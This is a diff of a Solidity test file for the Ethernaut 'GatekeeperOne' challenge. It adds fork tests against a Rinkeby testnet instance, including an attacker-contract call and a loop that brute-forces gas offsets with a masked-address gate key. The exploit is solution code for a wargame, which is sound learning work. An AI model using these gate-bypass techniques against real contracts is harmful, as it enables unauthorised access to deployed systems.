@@ -5,26 +5,57 @@ import { console } from "forge-std/console.sol";
 import { PRBTest } from "@prb/test/PRBTest.sol";
 
 import { GatekeeperOne } from "src/GatekeeperOne/GatekeeperOne.sol";
+import { GatekeeperOneAttack } from "src/GatekeeperOne/GatekeeperOneAttack.sol";
 
 import { toBytes } from "src/utils/toBytes.sol";
 import { bytes32ToString } from "src/utils/toString.sol";
 
 
-contract PrivacyAttackForkTest is PRBTest {
+contract GatekeeperOneAttackForkTest is PRBTest {
     uint256 public rinkeby;
-    address public gatekeeperInstance = address(0x536734cD63fb1E3b318eC09d7e0709737da436C0);
+    address public gatekeeperOneInstance = address(0x536734cD63fb1E3b318eC09d7e0709737da436C0);
+    GatekeeperOneAttack attacker;
+    address public playerAddress = address(0x696969696969);
 
     function setUp() public {
-        rinkeby = vm.createFork(vm.envString("ETH_RINKEBY_RPC_URL"));
+        rinkeby = vm.createSelectFork(vm.envString("ETH_RINKEBY_RPC_URL"), 11_289_580);
+        attacker = new GatekeeperOneAttack();
     }
 
-    function testForkGatekeeperOne() public {
-        vm.selectFork(rinkeby);
+    function testForkAttack() public {
+        vm.startPrank(playerAddress);
+            bool success = attacker.attack(gatekeeperOneInstance, 24827);
+            assert(success);
+        vm.stopPrank();
+        address entrant = GatekeeperOne(gatekeeperOneInstance).entrant();
+        // assert that entrant is not zero address
+        assert(entrant != address(0));
+    }
 
-        GatekeeperOne(gatekeeperInstance).enter(bytes8(toBytes(111)));
-        // success = GatekeeperOne(gatekeeperInstance).locked() == false;
-        // // assert that this is is the correct slot
-        // assert(success);
+    function testForkRealGasAttack() public {
+        vm.startPrank(playerAddress);
+            (bool success, uint gasAmount) = attacker.gasAttack(gatekeeperOneInstance);
+            assert(success);
+            emit LogNamedUint256("GAS AMOUNT", gasAmount);
+        vm.stopPrank();
+        address entrant = GatekeeperOne(gatekeeperOneInstance).entrant();
+        // assert that entrant is not zero address
+        assert(entrant != address(0));
+    }
+
+    function testForkGasAttack() public {
+        uint gasBase = 8191 * 3; // gas needs to be a multiple of 8191. 3 is the lowest that will complete the tx
+        bytes8 gateKey = bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF);
+
+        vm.startPrank(playerAddress);
+        for (uint muhgas = 0; muhgas <= 8191; muhgas++) {
+            try GatekeeperOne(gatekeeperOneInstance).enter{gas: gasBase + muhgas}(gateKey) {
+                emit LogNamedUint256("Passed Gas", gasBase + muhgas);
+                break;
+            } catch {
+                emit LogNamedUint256("Failed Gas", gasBase + muhgas);
+            }
+        }
     }
 
 }
